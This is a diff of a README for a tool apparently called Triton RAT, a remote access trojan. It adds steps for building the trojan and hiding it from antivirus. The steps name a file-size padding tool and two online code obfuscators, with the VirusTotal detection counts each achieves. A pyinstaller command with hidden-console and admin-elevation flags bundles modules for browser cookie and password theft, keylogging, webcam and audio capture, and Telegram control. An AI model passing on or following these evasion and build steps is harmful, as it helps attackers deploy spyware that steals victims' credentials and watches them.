@@ -77,12 +77,19 @@ $ https://github.com/WhiteeRabbit/fake_file_resizer
 # Download fake_file_resizer, then run:
 $ python fake_file_resizer.py
 # Enter your exe, then enter output file name after that write output file size in mb(don't write mb).
-# Today this is the best obfuscation method of obfuscation 
+# Without manipulations with fake_file_resizer (no obfuscated) it shows 11 detects in virustotal, but with my ip is shows only 4 detects
+# Today this is the best method of obfuscation 
+# If you want to obfuscate CODE that I'm recomending to you these 2 websites:
+# First (6 detection):https://pyob.oxyry.com/ (use this after minifiering the code ,because code's too long)
+# Second (5 detection): https://python-minifier.com/
+# First, copy the full code of Triton_RAT_Release.py then paste it in second link
+# After that, paste minified code in Triton_RAT_Release.py then build it with pyinstaller⬇️
 
-
-# after downloading pyinstaller run:
+# After downloading pyinstaller run:
 $ pyinstaller --onefile --noconsole --uac-admin --hidden-import telebot --hidden-import pyautogui --hidden-import cv2 --hidden-import json --hidden-import base64 --hidden-import sqlite3 --hidden-import win32crypt --hidden-import Cryptodome.Cipher.AES --hidden-import shutil --hidden-import datetime --hidden-import numpy --hidden-import pyaudio --hidden-import wave --hidden-import random --hidden-import browser_cookie3 --hidden-import pyttsx3 --hidden-import pynput Triton_Rat_Release.py
 
+# Some people says that you can decrease detections count with adding --key "testname" attribute when building it with pyinstaller
+# But, it didn't worked for me...
 
 
 # wait for building exe
